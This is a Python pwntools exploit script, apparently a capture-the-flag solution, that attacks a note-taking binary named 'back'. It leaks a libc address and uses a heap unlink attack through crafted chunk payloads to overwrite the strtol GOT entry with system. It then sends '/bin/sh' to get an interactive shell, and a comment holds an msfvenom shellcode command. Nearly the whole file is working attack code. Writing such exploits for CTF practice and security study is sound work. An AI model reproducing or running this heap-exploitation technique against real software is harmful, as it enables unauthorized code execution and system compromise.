#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-10 07:10:29
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./back"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'
libc = ELF("./libc")

if DEBUG:
	p = process(target)
	# gdb.attach(p,"b*0x0400EB5\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)


def add():
	ru("hoice:\n")
	sl("1")
def edit(index,data):
	ru("hoice:\n")
	sl("2")
	ru("hoice:\n")
	sl(str(index))
	ru("note...\n")
	sl(data)
def free(index):
	ru("hoice:\n")
	sl("3")
	ru("hoice:\n")
	sl(str(index))
def view(index):
	ru("hoice:\n")
	sl("4")
	ru("hoice:\n")
	sl(str(index))
def edit2(data):
	ru("hoice:\n")
	sl("4919")
	ru("hack this...\n")
	sl(data)

## get libc
ru("oracle:")
puts_addr = int(p.recv(len("0x7f45a0c2aa30"))[2:],16)
system_addr = puts_addr-libc.symbols["puts"]+libc.symbols["system"]


## unlink
add()#0
add()#1
add()#2
payload0 = "a"*0x50+p64(0)+p64(0xa1)
edit(0,payload0)
payload1 = 'a'*0x60+p64(0)+p64(0x81)+p64(0x6020A0-0x18)+p64(0x6020A0-0x10)#p->fd->bk == p
edit(1,payload1)
payload2 = 'a'*0x50+p64(0x80)+p64(0)
edit(2,payload2)
free(1)
# now the note2_addr = 0x6020A0-0x18

## change got
edit2(p64(rop.got('strtol')-0x18))

edit2(p64(system_addr))
sl("/bin/sh\x00")
p.interactive()